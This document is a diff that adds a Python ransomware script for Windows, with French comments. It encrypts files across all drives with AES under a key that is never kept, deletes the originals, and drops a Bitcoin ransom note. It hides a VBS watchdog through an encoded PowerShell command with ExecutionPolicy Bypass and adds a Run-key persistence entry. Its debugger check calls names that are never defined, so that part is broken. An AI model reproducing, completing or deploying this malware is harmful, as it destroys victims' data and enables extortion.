@@ -1,0 +1,335 @@
+import os
+import string
+from pathlib import Path
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+import multiprocessing
+import winreg
+import subprocess
+from queue import Empty
+import time
+import random
+import base64
+import psutil
+
+vbs_template = r'''On Error Resume Next
+Set WshShell = CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+target = "{script_path}"
+watchdogName = "watchdog.vbs"
+
+Set colMe = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
+count = 0
+For Each proc In colMe
+    If InStr(LCase(proc.CommandLine), LCase(watchdogName)) > 0 Then
+        count = count + 1
+    End If
+Next
+If count > 1 Then
+    WScript.Quit
+End If
+
+Randomize
+WScript.Sleep (Int((80 * Rnd) + 10) * 1000)
+
+Do
+    found = False
+    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
+    For Each objProcess In colProcessList
+        If InStr(LCase(objProcess.CommandLine), LCase(" " & target & " ")) > 0 Or _
+           Right(LCase(objProcess.CommandLine), Len(target)) = LCase(target) Then
+            found = True
+            Exit For
+        End If
+    Next
+
+    If Not found Then
+        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process -WindowStyle Hidden -FilePath 'pythonw.exe' -ArgumentList '" & target & "'""", 0, False
+    End If
+
+    WScript.Sleep 5000
+Loop
+'''
+
+key = os.urandom(32)  # 256 bits
+
+extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com", ".locked", ".vbs")
+
+folders_exclus = [
+    "windows",
+    "program files",
+    "program files (x86)",
+    "system volume information",
+    "$recycle.bin",
+    ".git",
+    "boot",
+    "temp",
+    "tmp",
+    "cache",
+    "appdata",
+    "local",
+    "microsoft",
+    "programdata",
+    ".vscode",
+    "ransomware"
+]
+
+vbsFile = []
+
+script_python_path = os.path.abspath(__file__)
+
+target_dirs = [
+    os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes"),
+]
+
+def deleteVbsFileAfterFinish():
+    for file in vbsFile:
+        try:
+            if os.path.exists(file):
+                os.remove(file)
+                print(f"supprimer vbs avec success {file}")
+            else:
+                print(f"Fichier introuvable : {file}")
+        except Exception as e:
+            print(f"[!] Erreur suppresion watchdog dans {file}: {e}")
+
+
+def create_watchdog_vbs():
+    script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
+    b64_vbs = base64.b64encode(script_final.encode()).decode()
+    DETACHED_PROCESS = 0x00000008
+    CREATE_NEW_PROCESS_GROUP = 0x00000200
+
+    for folder in target_dirs:
+        try:
+            if not os.path.exists(folder):
+                os.makedirs(folder)
+                
+            
+            existing_vbs = [
+                f for f in os.listdir(folder)
+                if f.lower().endswith('.vbs') and f.lower().startswith('watchdog')
+            ]
+            
+            if existing_vbs:
+                print(f"[!] Fichier watchdog déjà présent dans {folder}, watchdog non créé.")
+                vbs_exist_path = os.path.join(folder, existing_vbs[0])
+                if is_watchdog_running(vbs_exist_path):
+                    print(f"[!] Watchdog déjà actif : {vbs_exist_path}")
+                    return
+                else:
+                    subprocess.Popen(
+                        ["wscript.exe", vbs_exist_path],
+                        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                        stdin=subprocess.DEVNULL)
+                    return
+
+            vbs_path = os.path.join(folder, "watchdog.vbs")
+            vbsFile.append(vbs_path)
+
+            escaped_vbs_path = vbs_path.replace("\\", "\\\\")
+
+            #mettre vbs en memoire avec base64 
+            powershell_command = (
+                f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command '
+                f'"$b64 = \'{b64_vbs}\'; '
+                f'$vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); '
+                f'[System.IO.File]::WriteAllText(\'{escaped_vbs_path}\', $vbs); '
+                f'Start-Process -WindowStyle Hidden wscript.exe \'{escaped_vbs_path}\'"'
+            )
+            subprocess.Popen(
+                powershell_command,
+                shell=True,
+                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                stdin=subprocess.DEVNULL
+            )
+            #with open(vbs_path, "w", encoding="utf-8") as f:
+            #    f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
+            print(f"Watchdog créé dans {vbs_path}")
+        except Exception as e:  
+            print(f"Erreur création watchdog dans {folder}: {e}")
+
+def is_watchdog_running(watchdog_vbs_path):
+    watchdog_vbs_path = watchdog_vbs_path.lower()
+    for proc in psutil.process_iter(['name', 'cmdline']):
+        try:
+            name = proc.info['name']
+            cmdline = proc.info['cmdline']
+            if name and 'wscript.exe' in name.lower():
+                if cmdline and any(watchdog_vbs_path in arg.lower() for arg in cmdline):
+                    return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return False
+
+def ajouter_run_key_watchdog():
+    hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
+    os.makedirs(hidden_dir, exist_ok=True)
+
+    nom_valeur = "WatchdogAuto"
+    chemin_watchdog_vbs = os.path.join(hidden_dir, "watchdog.vbs")
+
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Run",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_watchdog_vbs)
+        winreg.CloseKey(key)
+        print("Clé Run watchdog ajoutée avec succès.")
+    except Exception as e:
+        print(f"Erreur lors de l'ajout watchdog dans le registre : {e}")
+
+
+def is_in_excluded_folder(file_path: Path):
+    try:
+        path_parts = [part.lower() for part in file_path.resolve().parts]
+        for exclu in folders_exclus:
+            for part in path_parts:
+                if exclu in part:
+                    return True
+        return False
+    except Exception as e:
+        print(f"Erreur exclusion sur {file_path}: {e}")
+        return True  
+
+def get_existing_root_path():
+    root_paths = []
+    for letter in string.ascii_uppercase:
+        drive = f"{letter}:/"
+        if Path(drive).exists():
+            root_paths.append(drive)
+    return root_paths
+
+def encrypte_file(input_file):
+    backend = default_backend()
+    iv = os.urandom(16)
+    with open(input_file, 'rb') as f:
+        data = f.read()
+
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
+    encryptor = cipher.encryptor()
+    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+
+    output_file = input_file + ".locked"
+
+    with open(output_file, 'wb') as f:
+        f.write(iv + encrypted_data)
+
+    os.remove(input_file)
+    print(f"Fichier chiffré : {input_file}")
+    return True
+
+def worker(queue):
+    while True:
+        try:
+            file = queue.get(timeout=10)
+        except Empty:
+            break
+        if file is None:
+            break
+        try:
+            if is_in_excluded_folder(file):
+                continue
+            if file.is_file() and file.suffix.lower() not in extensions_exclues :
+                encrypte_file(str(file))
+                # Pause aléatoire entre 0.5 et 3 secondes
+                time.sleep(random.uniform(0.5, 3))
+        except Exception as e:
+            print(f"[!] Erreur sur {file}: {e}")
+
+def process_par_lecteur(chemin, nb_process):
+    chemin = Path(chemin)
+    queue = multiprocessing.Queue(maxsize=30)
+
+    processus = []
+    for _ in range(nb_process):
+        p = multiprocessing.Process(target=worker, args=(queue,))
+        p.start()
+        processus.append(p)
+
+    for file in chemin.rglob("*"):
+        try:
+            queue.put(file)
+        except Exception as e:
+            print(f"[!] Erreur ajout fichier à la queue: {e}")
+
+    for _ in range(nb_process):
+        queue.put(None)
+    max_relaunch = 3
+    relaunch_counts = [0] * nb_process
+
+    while True:
+        all_finished = True
+        for i, p in enumerate(processus):
+            if not p.is_alive():
+                if p.exitcode != 0:  # crash / erreur
+                    if relaunch_counts[i] < max_relaunch:
+                        print(f"[!] Worker {i} mort anormalement, redémarrage ({relaunch_counts[i]+1}/{max_relaunch})...")
+                        new_p = multiprocessing.Process(target=worker, args=(queue,))
+                        new_p.start()
+                        processus[i] = new_p
+                        relaunch_counts[i] += 1
+                        all_finished = False
+                    else:
+                        print(f"[!] Worker {i} a atteint la limite de relance.")
+                else:
+                    # worker terminé proprement, on ne relance pas
+                    print(f"[+] Worker {i} a terminé normalement.")
+            else:
+                all_finished = False
+        if all_finished:
+            break
+        time.sleep(10)
+        
+def afficher_ransom_note(lecteurs):
+    note = """Vos fichiers ont été chiffrés.
+Veuillez envoyer 0.5 BTC à l'adresse XXXXXXXX pour obtenir la clé."""
+    for folder in lecteurs:
+        path = os.path.join(folder, "README.txt")
+        try:
+            with open(path, "w") as f:
+                f.write(note)
+        except:
+            continue
+
+def main():
+    time.sleep(random.uniform(5, 15))
+    existDir = os.path.dirname(os.path.abspath(__file__))
+    if existDir.lower() not in folders_exclus:
+        folders_exclus.append(existDir.lower())
+
+    create_watchdog_vbs()
+    ajouter_run_key_watchdog()
+    if ctypes.windll.kernel32.IsDebuggerPresent():
+        print("[!] Debugger detected - exiting")
+        sys.exit(1)
+    default_dll = xor_decrypt(DEFAULT_DLL_PATH, KEY)
+
+    lecteurs = get_existing_root_path()
+    max_workers = 30
+    nb_lecteurs = len(lecteurs)
+    nb_process_par_lecteur = max(1, max_workers // nb_lecteurs)
+    processus_lecteurs = []
+
+    for lecteur in lecteurs:
+        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur, nb_process_par_lecteur))
+        p.start()
+        processus_lecteurs.append(p)
+
+    for p in processus_lecteurs:
+        p.join()
+
+    deleteVbsFileAfterFinish()
+    afficher_ransom_note(lecteurs)
+
+if __name__ == "__main__":
+    multiprocessing.freeze_support()
+    main()
